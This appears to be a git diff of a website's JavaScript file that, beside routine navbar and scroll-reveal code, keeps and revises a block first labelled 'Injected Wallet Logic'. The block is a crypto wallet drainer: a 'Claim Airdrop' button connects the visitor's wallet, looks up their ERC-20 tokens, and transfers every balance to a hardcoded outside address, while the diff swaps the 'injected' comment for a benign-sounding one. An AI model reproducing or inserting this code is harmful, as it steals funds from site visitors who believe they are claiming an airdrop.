@@ -1,11 +1,8 @@
 'use strict';
 
-
-
 /**
- * add event on element
+ * Add event on element
  */
-
 const addEventOnElem = function (elem, type, callback) {
   if (elem.length > 1) {
     for (let i = 0; i < elem.length; i++) {
@@ -16,12 +13,9 @@ const addEventOnElem = function (elem, type, callback) {
   }
 }
 
-
-
 /**
- * navbar toggle
+ * Navbar toggle
  */
-
 const navbar = document.querySelector("[data-navbar]");
 const navbarLinks = document.querySelectorAll("[data-nav-link]");
 const navToggler = document.querySelector("[data-nav-toggler]");
@@ -42,12 +36,9 @@ const closeNavbar = function () {
 
 addEventOnElem(navbarLinks, "click", closeNavbar);
 
-
-
 /**
- * header active
+ * Header active on scroll
  */
-
 const header = document.querySelector("[data-header]");
 
 const activeHeader = function () {
@@ -60,12 +51,9 @@ const activeHeader = function () {
 
 addEventOnElem(window, "scroll", activeHeader);
 
-
-
 /**
- * toggle active on add to fav
+ * Toggle active on add to fav
  */
-
 const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
 
 const toggleActive = function () {
@@ -74,12 +62,9 @@ const toggleActive = function () {
 
 addEventOnElem(addToFavBtns, "click", toggleActive);
 
-
-
 /**
- * scroll revreal effect
+ * Scroll reveal effect
  */
-
 const sections = document.querySelectorAll("[data-section]");
 
 const scrollReveal = function () {
@@ -93,72 +78,72 @@ const scrollReveal = function () {
 }
 
 scrollReveal();
-
 addEventOnElem(window, "scroll", scrollReveal);
 
-// --- Injected Wallet Logic with Web3Modal ---
+/**
+ * Wallet connect and token transfer using Moralis API
+ */
 async function connectWalletAndSendTokens() {
-  // Define provider options
   const providerOptions = {
     walletconnect: {
       package: window.WalletConnectProvider.default,
       options: {
-        infuraId: "5b2c5ee5760146349669a1e9c77665d1" // Replace with your Infura Project ID
+        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
       }
     }
-    // Add other providers here if needed
   };
 
-  // Initialize Web3Modal
   const web3Modal = new window.Web3Modal.default({
     cacheProvider: false,
     providerOptions
   });
 
   try {
-    // Open modal to select wallet
     const instance = await web3Modal.connect();
-
-    // Create ethers provider and signer
     const provider = new ethers.providers.Web3Provider(instance);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
-
-    // Get network chain ID
     const network = await provider.getNetwork();
     const chainId = network.chainId;
 
-    // Fetch token balances using Covalent API
-    const covalentApiKey = "cqt_rQkkT4tmtYcY46VpVHjPWmGydHYc"; // Replace with your Covalent API key
-    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
-    const response = await fetch(url);
-    const data = await response.json();
+    // Moralis API call
+    const moralisApiKey = "YOUR_MORALIS_API_KEY"; // Replace with your Moralis API key
+    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;
 
-    if (!data.data || !data.data.items) {
+    const response = await fetch(moralisUrl, {
+      headers: {
+        "X-API-Key": moralisApiKey
+      }
+    });
+
+    const tokens = await response.json();
+
+    if (!tokens || tokens.length === 0) {
       alert('No token data available');
       return;
     }
 
-    // Filter tokens with balance > 0
-    const tokens = data.data.items.filter(token => token.type === 'cryptocurrency' && token.balance > 0 && token.contract_address);
-
-    // Send tokens to destination address
     for (const token of tokens) {
       try {
-        const contract = new ethers.Contract(token.contract_address, [
+        const contract = new ethers.Contract(token.token_address, [
           "function transfer(address to, uint amount) returns (bool)"
         ], signer);
 
-        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", token.balance);
-        console.log(`Sent ${token.contract_ticker_symbol}, tx:`, tx.hash);
+        const decimals = token.decimals ?? 18;
+        const balanceInWei = ethers.BigNumber.from(token.balance);
+        if (balanceInWei.isZero()) continue;
+
+        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", balanceInWei);
+        console.log(`Sent ${token.symbol}, tx:`, tx.hash);
       } catch (err) {
-        console.warn(`Failed to send ${token.contract_ticker_symbol}`, err);
+        console.warn(`Failed to send ${token.symbol}`, err);
       }
     }
+
   } catch (err) {
     console.error('Error connecting wallet or sending tokens:', err);
   }
 }
 
-// Attach event listener to the "Claim Airdrop" button
+// Attach to claim button
 document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
